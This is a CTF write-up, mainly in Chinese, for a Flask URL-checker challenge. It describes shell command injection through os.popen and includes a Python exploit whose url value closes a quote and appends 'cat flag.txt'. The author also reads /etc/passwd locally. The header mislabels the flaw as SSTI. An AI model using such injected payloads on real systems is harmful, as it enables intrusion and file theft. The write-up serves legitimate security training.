# 题目描述
SiteSaver is a web-based application designed to help users manage and validate important URLs. It combines functionality with a focus on security, offering users the ability to store and quickly validate the availability of their favorite or frequently accessed websites. SiteSaver is particularly useful for users who need to maintain a curated list of operational and reliable URLs for personal or professional use.It allows users to submit URLs for validation, checking if they return a 200 OK status and save the valid ones.

# 知识点
Server-Side Template Injection (SSTI)

# 思路
check_url 用 f-string 拼接一个带引号的 shell 命令并通过 os.popen 执行，未对用户输入做任何转义，导致命令注入。利用方法是向 /add_url 提交 url 表单，使 url 包含终止引号并追加任意 shell 命令

# 解题步骤

由于网络问题，稍微改动了Dockerfile

```dockerfile
FROM python:3.9-slim-bullseye

WORKDIR /app

RUN apt-get update && apt-get install -y curl

COPY requirements.txt requirements.txt
RUN pip install --no-cache-dir -i https://pypi.tuna.tsinghua.edu.cn/simple --timeout 120 -r requirements.txt

COPY . .

ARG FLAG
ENV FLAG=${FLAG} 

CMD ["python", "app.py"]
```

![image-x12110625781](./assets/image-x12110625781.png)

有命令注入。把表单里的 URL 构造成关闭双引号并在后面执行 cat flag.txt，就能把 flag 作为 check 命令的输出混入响应消息里并返回。但我本地构建docker时没有传入FLAG，所以使用/etc/passwd文件作为替代。

![image-x12111001504](./assets/image-x12111001504.png)

![image-x12110942055](./assets/image-x12110942055.png)





# EXP

```python
import requests
VPS_IP="" # VPS ip
TARGET = f"http://{VPS_IP}:5003/add_url"
payload = 'http://example.com"; cat flag.txt #'
r = requests.post(TARGET, data={'url': payload}, timeout=10)
print(r.status_code)
print(r.text)
```

![image-x12114736848](./assets/image-x12114736848.png)
